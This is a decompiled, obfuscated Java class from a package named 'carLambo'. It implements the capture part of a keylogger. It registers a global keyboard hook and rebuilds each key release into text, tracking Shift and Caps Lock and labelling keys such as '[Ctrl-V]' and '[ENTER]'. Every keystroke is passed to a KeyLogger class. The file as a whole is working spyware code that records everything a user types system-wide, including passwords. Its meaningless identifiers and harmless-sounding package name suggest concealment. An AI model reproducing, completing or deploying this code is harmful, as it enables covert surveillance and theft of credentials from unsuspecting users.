package carLambo;

import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;

final class KeyAdapter extends GlobalKeyAdapter {
   // $FF: synthetic field
   private KeyLogger sdfsldf;

   KeyAdapter(KeyLogger var1) {
      this.sdfsldf = var1;
      
   }

   public final void keyReleased(GlobalKeyEvent var1) {
      GlobalKeyEvent var10000;
      char var2;
      label645: {
         var2 = var1.getKeyChar();
         if (var1.getVirtualKeyCode() == 20) {
            if (KeyLogger.sdfsldf(this.sdfsldf)) {
               var10000 = var1;
               KeyLogger.sabretb(this.sdfsldf, false);
               break label645;
            }

            KeyLogger.sabretb(this.sdfsldf, true);
         }

         var10000 = var1;
      }

      char var4;
      if (var10000.isShiftPressed() && var1.getVirtualKeyCode() == 49) {
         var4 = '!';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 50) {
         var4 = '@';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 51) {
         var4 = '#';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 52) {
         var4 = '$';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 53) {
         var4 = '%';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 54) {
         var4 = '^';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 55) {
         var4 = '&';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 56) {
         var4 = '*';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 57) {
         var4 = '(';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 48) {
         var4 = ')';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 189) {
         var4 = '_';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 187) {
         var4 = '+';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 219) {
         var4 = '{';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 220) {
         var4 = '|';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 221) {
         var4 = '}';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 192) {
         var4 = '~';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 191) {
         var4 = '?';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 188) {
         var4 = '<';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 190) {
         var4 = '>';
      } else if (var1.isShiftPressed() && var1.getVirtualKeyCode() == 222) {
         var4 = '"';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 65) {
         var4 = 'A';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 66) {
         var4 = 'B';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 67) {
         var4 = 'C';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 68) {
         var4 = 'D';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 69) {
         var4 = 'E';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 70) {
         var4 = 'F';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 71) {
         var4 = 'G';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 72) {
         var4 = 'H';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 73) {
         var4 = 'I';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 74) {
         var4 = 'J';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 75) {
         var4 = 'K';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 76) {
         var4 = 'L';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 77) {
         var4 = 'M';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 78) {
         var4 = 'N';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 79) {
         var4 = 'O';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 80) {
         var4 = 'P';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 81) {
         var4 = 'Q';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 82) {
         var4 = 'R';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 83) {
         var4 = 'S';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 84) {
         var4 = 'T';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 85) {
         var4 = 'U';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 86) {
         var4 = 'V';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 87) {
         var4 = 'W';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 88) {
         var4 = 'X';
      } else if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 89) {
         var4 = 'Y';
      } else {
         if ((var1.isShiftPressed() || KeyLogger.sdfsldf(this.sdfsldf)) && var1.getVirtualKeyCode() == 90) {
            var2 = 'Z';
         }

         var4 = var2;
      }

      String var3 = String.valueOf(var4);
      if (var1.isControlPressed() && var1.getVirtualKeyCode() == 65) {
         var3 = "[Ctrl-A]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 66) {
         var3 = "[Ctrl-B]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 67) {
         var3 = "[Ctrl-C]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 68) {
         var3 = "[Ctrl-D]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 69) {
         var3 = "[Ctrl-E]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 70) {
         var3 = "[Ctrl-F]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 71) {
         var3 = "[Ctrl-G]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 72) {
         var3 = "[Ctrl-H]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 73) {
         var3 = "[Ctrl-I]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 74) {
         var3 = "[Ctrl-J]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 75) {
         var3 = "[Ctrl-K]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 76) {
         var3 = "[Ctrl-L]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 77) {
         var3 = "[Ctrl-M]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 78) {
         var3 = "[Ctrl-N]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 79) {
         var3 = "[Ctrl-O]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 80) {
         var3 = "[Ctrl-P]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 81) {
         var3 = "[Ctrl-Q]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 82) {
         var3 = "[Ctrl-R]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 83) {
         var3 = "[Ctrl-S]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 84) {
         var3 = "[Ctrl-T]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 85) {
         var3 = "[Ctrl-U]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 86) {
         var3 = "[Ctrl-V]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 87) {
         var3 = "[Ctrl-W]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 88) {
         var3 = "[Ctrl-X]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 89) {
         var3 = "[Ctrl-Y]";
      } else if (var1.isControlPressed() && var1.getVirtualKeyCode() == 90) {
         var3 = "[Ctrl-Z]";
      } else if (var1.getVirtualKeyCode() == 8) {
         var3 = "[Back]";
      } else if (var1.getVirtualKeyCode() == 38) {
         var3 = "[UP]";
      } else if (var1.getVirtualKeyCode() == 40) {
         var3 = "[DOWN]";
      } else if (var1.getVirtualKeyCode() == 37) {
         var3 = "[LEFT]";
      } else if (var1.getVirtualKeyCode() == 39) {
         var3 = "[RIGHT]";
      } else if (var1.getVirtualKeyCode() == 27) {
         var3 = "[esc]";
      } else if (var1.getVirtualKeyCode() == 13) {
         var3 = "[ENTER]";
      }

      KeyLogger.sdfsldf(this.sdfsldf, var3);
   }

   public final void keyPressed(GlobalKeyEvent var1) {
      var1.getVirtualKeyCode();
   }
}
